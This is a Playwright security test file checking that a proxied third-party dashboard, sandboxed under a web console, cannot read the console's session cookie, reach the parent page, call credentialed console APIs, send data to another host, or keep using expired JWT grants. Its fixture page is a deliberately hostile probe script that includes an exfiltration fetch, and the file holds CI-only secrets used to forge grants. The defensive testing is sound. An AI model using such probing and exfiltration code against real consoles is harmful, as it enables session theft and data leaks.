import { createHmac } from 'node:crypto';
import { createServer, type Server } from 'node:http';
import { test, expect, type Page } from '@playwright/test';
import { SignJWT, decodeJwt } from 'jose';
import { installFrameGrantRelay } from '../src/lib/frame-grant-relay';

/**
 * A proxied third-party dashboard must not act with console authority. The harness points the
 * (deprecated) router admin proxy at a fixture served here, whose page script tries everything
 * a compromised dashboard would: read the console session cookie and storage, reach the parent
 * console page, call console APIs with the browser's credentials, send data to another host, and
 * mint a new grant. The Hermes dashboard proxy shares the same isolation
 * (runtime-embed-isolation.mjs), including the short-lived grants and their renewal.
 */
const port = Number(process.env['MAGNUS_EMBED_FIXTURE_PORT'] ?? 0);
test.skip(!port, 'needs the browser harness (playwright.ci.config.ts)');

const PROBE = `<!doctype html><html><head><meta charset="utf-8"><title>Fixture admin UI</title></head><body>
<pre id="probe"></pre>
<script>
(async function () {
  var out = { origin: self.origin, attempts: {} };
  try { out.cookie = document.cookie; } catch (e) { out.cookie = 'threw ' + e.name; }
  try { localStorage.setItem('k', 'v'); out.storage = localStorage.getItem('k'); } catch (e) { out.storage = 'threw ' + e.name; }
  try { out.parentTitle = window.parent === window ? 'top' : String(window.parent.document.title); } catch (e) { out.parentTitle = 'threw ' + e.name; }
  // Built at run time, as hostile code would, so the proxy's URL rewriting cannot help.
  var api = '/' + 'api/';
  var tries = [
    ['nodes', api + 'proxy/nodes', { credentials: 'include' }],
    ['me', api + 'auth/me', { credentials: 'include' }],
    ['write', api + 'proxy/commands', { method: 'POST', credentials: 'include', headers: { 'content-type': 'application/json' }, body: '{}' }],
    ['writeNoCors', api + 'proxy/commands', { method: 'POST', credentials: 'include', mode: 'no-cors', body: '{}' }],
    ['regrant', api + 'hive-router/dashboard', { credentials: 'include' }],
    // A host that would answer any origin: only the frame's connect-src stops it.
    ['exfil', 'http://127.0.0.1:${port}/exfil', {}],
  ];
  for (var i = 0; i < tries.length; i++) {
    try {
      var res = await fetch(tries[i][1], tries[i][2]);
      out.attempts[tries[i][0]] = res.type === 'opaque' ? 'opaque' : res.status + ' ' + (await res.text()).slice(0, 80);
    } catch (e) { out.attempts[tries[i][0]] = 'blocked'; }
  }
  // The dashboard's own API (rewritten onto the frame URL) keeps working, with its own login.
  try {
    var login = await fetch("/api/login", { method: 'POST', credentials: 'include' });
    var who = await fetch("/api/whoami", { credentials: 'include' });
    out.own = login.status + ' ' + (await who.text());
  } catch (e) { out.own = 'threw ' + e.message; }
  var pre = document.getElementById('probe');
  pre.textContent = JSON.stringify(out);
  pre.setAttribute('data-done', '1');
})();
</script></body></html>`;

/** Waits for a renewed grant, then calls its own API after the first grant expired. */
const RENEW = `<!doctype html><html><head><meta charset="utf-8"></head><body><pre id="probe"></pre>
<script>
(async function () {
  var out = {};
  out.renewed = await new Promise(function (done) {
    window.addEventListener('magnus:frame-grant', function () { done(true); });
    setTimeout(function () { done(false); }, 10000);
  });
  await new Promise(function (done) { setTimeout(done, 7000); });
  try { var who = await fetch("/api/whoami", { credentials: 'include' }); out.own = who.status + ' ' + (await who.text()); }
  catch (e) { out.own = 'threw ' + e.message; }
  var pre = document.getElementById('probe');
  pre.textContent = JSON.stringify(out);
  pre.setAttribute('data-done', '1');
})();
</script></body></html>`;

let server: Server;
const routerCookies: string[] = [];
const exfiltrated: string[] = [];

// The harness's session secret (scripts/start-ui-ci.mjs), to forge nearly expired grants.
const GRANT_KEY = createHmac('sha256', 'ci-only-session-secret-0123456789abcdef0123456789').update('magnus-embedded-dashboard-grant/v1').digest();

/** Re-sign a real grant's scope with another expiry, as an old copy of its URL would carry. */
async function regrant(grant: string, exp: number): Promise<string> {
  const claims = decodeJwt(grant);
  return new SignJWT({ app: claims['app'], u: claims['u'], sid: claims['sid'], sexp: claims['sexp'] })
    .setProtectedHeader({ alg: 'HS256' }).setIssuer(String(claims.iss)).setAudience(String(claims.aud))
    .setIssuedAt(exp - 600).setExpirationTime(exp).sign(GRANT_KEY);
}

async function mint(page: Page): Promise<{ grant: string; frameUrl: string }> {
  const response = await page.request.get('/api/hive-router/dashboard?mint=json');
  expect(response.status()).toBe(200);
  return await response.json() as { grant: string; frameUrl: string };
}

test.beforeAll(async () => {
  server = createServer((req, res) => {
    routerCookies.push(String(req.headers.cookie ?? ''));
    if (req.url === '/exfil') {
      exfiltrated.push(String(req.headers.origin));
      res.writeHead(200, { 'access-control-allow-origin': '*' });
      res.end('leaked');
    } else if (req.url === '/renew') {
      res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
      res.end(RENEW);
    } else if (req.url === '/api/login') {
      res.writeHead(200, { 'content-type': 'application/json', 'set-cookie': 'fixture_admin=signed-in; Path=/; HttpOnly' });
      res.end('{}');
    } else if (req.url === '/api/whoami') {
      res.writeHead(200, { 'content-type': 'text/plain' });
      res.end(/fixture_admin=signed-in/.test(String(req.headers.cookie)) ? 'router-admin' : 'anonymous');
    } else {
      res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
      res.end(PROBE);
    }
  });
  await new Promise<void>((resolve) => server.listen(port, '127.0.0.1', resolve));
});

test.afterAll(async () => {
  await new Promise((resolve) => server.close(resolve));
});

async function signIn(page: Page): Promise<void> {
  await page.goto('/login');
  await page.getByLabel('Username').fill('ci-admin');
  await page.getByLabel('Password', { exact: true }).fill('ci-only-browser-password');
  await page.getByRole('button', { name: 'Sign In', exact: true }).click();
  await expect(page).toHaveURL('/');
}

/**
 * Every console API response the dashboard document received, by path, read from the browser's
 * network layer (Chromium reports responses that CORS then hides from the page's script).
 */
async function watchConsoleApi(page: Page): Promise<Map<string, number[]>> {
  const seen = new Map<string, number[]>();
  const cdp = await page.context().newCDPSession(page);
  await cdp.send('Network.enable');
  const frameRequests = new Map<string, string>();
  cdp.on('Network.requestWillBeSent', (event) => {
    const path = new URL(event.request.url).pathname;
    if (event.type === 'Document' || !event.documentURL.includes('/_frame/')) return;
    if (/^\/api\/(proxy|auth)\//.test(path) || path === '/api/hive-router/dashboard') frameRequests.set(event.requestId, path);
  });
  // The raw response, which also arrives for requests that CORS then hides from the page.
  cdp.on('Network.responseReceivedExtraInfo', (event) => {
    const path = frameRequests.get(event.requestId);
    if (path) seen.set(path, [...(seen.get(path) ?? []), event.statusCode]);
  });
  return seen;
}

async function expectIsolated(result: Record<string, unknown>, seen: Map<string, number[]>): Promise<void> {
  expect(result['origin']).toBe('null');
  expect(String(result['cookie'])).not.toContain('magnus_session');
  // The stand-in storage keeps sandboxed pages working without touching the console's.
  expect(result['storage']).toBe('v');
  const attempts = result['attempts'] as Record<string, string>;
  for (const name of ['nodes', 'me', 'write', 'regrant', 'exfil']) expect(attempts[name], name).toBe('blocked');
  expect(exfiltrated).toEqual([]);
  expect(attempts['writeNoCors']).toBe('opaque');
  // What reached the console was refused before any handler ran (network events can trail the page).
  for (const path of ['/api/proxy/nodes', '/api/auth/me', '/api/proxy/commands', '/api/hive-router/dashboard']) {
    await expect.poll(() => seen.get(path)?.length ?? 0, { message: `${path} reached the console`, timeout: 5_000 }).toBeGreaterThan(0);
  }
  for (const [path, statuses] of seen) {
    for (const status of statuses) expect([401, 403], `${path} answered ${status}`).toContain(status);
  }
  expect(result['own']).toBe('200 router-admin');
  // The console session never reached the router; its own login cookie did, from the server-side jar.
  expect(routerCookies.some((cookie) => cookie.includes('magnus_session'))).toBe(false);
}

test('a proxied dashboard opened in its own tab has no console authority', async ({ page }) => {
  await signIn(page);
  const seen = await watchConsoleApi(page);
  const response = await page.goto('/api/hive-router/dashboard');
  expect(new URL(page.url()).pathname).toMatch(/^\/api\/hive-router\/dashboard\/_frame\/[\w.-]+\/?$/);
  const policy = response!.headers()['content-security-policy'] ?? '';
  expect(policy).toMatch(/^sandbox /);
  expect(policy).not.toContain('allow-same-origin');
  await expect(page.locator('#probe[data-done]')).toBeAttached({ timeout: 15_000 });
  const result = JSON.parse(await page.locator('#probe').textContent() ?? '{}') as Record<string, unknown>;
  expect(result['parentTitle']).toBe('top');
  await expectIsolated(result, seen);
});

test('a proxied dashboard framed by the console cannot reach the console page or APIs', async ({ page }) => {
  await signIn(page);
  const seen = await watchConsoleApi(page);
  // Frame it exactly as the Hermes Web Gateway page does (HERMES_FRAME_SANDBOX; a unit test keeps them equal).
  await page.evaluate((sandbox) => {
    const frame = document.createElement('iframe');
    frame.id = 'embedded';
    frame.setAttribute('sandbox', sandbox);
    frame.src = '/api/hive-router/dashboard';
    document.body.appendChild(frame);
  }, 'allow-scripts allow-forms allow-popups allow-downloads');
  const probe = page.frameLocator('#embedded').locator('#probe[data-done]');
  await expect(probe).toBeAttached({ timeout: 15_000 });
  const result = JSON.parse(await probe.textContent() ?? '{}') as Record<string, unknown>;
  expect(result['parentTitle']).toMatch(/^threw /);
  await expectIsolated(result, seen);
  // The console itself is unaffected.
  expect((await page.request.get('/api/auth/me')).status()).toBe(200);
});

test('the console frame renews a short-lived grant, and an expired one only works with the console cookie', async ({ page, request }) => {
  await signIn(page);
  const { grant, frameUrl } = await mint(page);
  const claims = decodeJwt(grant);
  expect(Number(claims.exp) - Math.floor(Date.now() / 1000)).toBeLessThanOrEqual(600);

  // A grant about to expire, as the frame would hold one ten minutes in.
  const ending = await regrant(grant, Math.floor(Date.now() / 1000) + 6);
  await page.addScriptTag({ content: `window.__installRelay = ${installFrameGrantRelay.toString()};` });
  await page.evaluate(([url, first, sandbox]) => {
    const frame = document.createElement('iframe');
    frame.id = 'embedded';
    frame.setAttribute('sandbox', sandbox!);
    document.body.appendChild(frame);
    (window as unknown as { __installRelay: (f: HTMLIFrameElement, m: string, g: string) => void })
      .__installRelay(frame, '/api/hive-router/dashboard?mint=json', first!);
    frame.src = url!;
  }, [`/api/hive-router/dashboard/_frame/${ending}/renew`, ending, 'allow-scripts allow-forms allow-popups allow-downloads']);
  const probe = page.frameLocator('#embedded').locator('#probe[data-done]');
  await expect(probe).toBeAttached({ timeout: 25_000 });
  const result = JSON.parse(await probe.textContent() ?? '{}') as Record<string, unknown>;
  expect(result['renewed']).toBe(true);
  // The page's own API still answers after its first grant expired: it now uses the renewed one.
  expect(result['own']).toBe('200 anonymous');

  // The expired grant alone (a URL from a log or the history) reaches nothing.
  // (`request` shares no cookies with the signed-in page.)
  await expect.poll(async () => (await request.get(`/api/hive-router/dashboard/_frame/${ending}/api/whoami`)).status(), { timeout: 10_000 }).toBe(401);
  const anonymous = await request.get(`/api/hive-router/dashboard/_frame/${ending}`, { headers: { 'sec-fetch-mode': 'navigate' }, maxRedirects: 0 });
  expect(anonymous.status()).toBe(401);

  // A reload with the console cookie re-mints it.
  await page.goto(`/api/hive-router/dashboard/_frame/${ending}`);
  const reloaded = new URL(page.url()).pathname;
  expect(reloaded).toMatch(/^\/api\/hive-router\/dashboard\/_frame\/[\w.-]+\/?$/);
  expect(reloaded).not.toContain(ending);
  await expect(page.locator('#probe[data-done]')).toBeAttached({ timeout: 15_000 });
  expect(frameUrl).toBe(`/api/hive-router/dashboard/_frame/${grant}/`);
});

test('a reload inside the console frame after its grant expired reconnects through the console', async ({ page }) => {
  await signIn(page);
  const { grant } = await mint(page);
  const ending = await regrant(grant, Math.floor(Date.now() / 1000) + 3);
  await page.addScriptTag({ content: `window.__installRelay = ${installFrameGrantRelay.toString()};` });
  await page.evaluate(([url, first, sandbox]) => {
    const frame = document.createElement('iframe');
    frame.id = 'embedded';
    frame.setAttribute('sandbox', sandbox!);
    document.body.appendChild(frame);
    (window as unknown as { __installRelay: (f: HTMLIFrameElement, m: string, g: string) => void })
      .__installRelay(frame, '/api/hive-router/dashboard?mint=json', first!);
    frame.src = url!;
  }, [`/api/hive-router/dashboard/_frame/${ending}`, ending, 'allow-scripts allow-forms allow-popups allow-downloads']);
  await expect(page.frameLocator('#embedded').locator('#probe[data-done]')).toBeAttached({ timeout: 15_000 });
  // The page renewed its grant at once and moved its address onto it.
  await expect.poll(() => page.frames().find((f) => f.url().includes('/_frame/'))?.url() ?? '', { timeout: 10_000 }).not.toContain(ending);
  await page.waitForTimeout(4_000);
  // As the dashboard does on a 401, reload from inside the sandbox once the first grant expired.
  const embedded = page.frames().find((f) => f.url().includes('/_frame/'))!;
  await embedded.evaluate((first) => { location.href = location.href.replace(/(\/_frame\/)[^/?#]+/, '$1' + first); }, ending);
  await expect(page.frameLocator('#embedded').locator('#probe[data-done]')).toBeAttached({ timeout: 15_000 });
  expect(page.frames().find((f) => f.url().includes('/_frame/'))!.url()).not.toContain(ending);
});
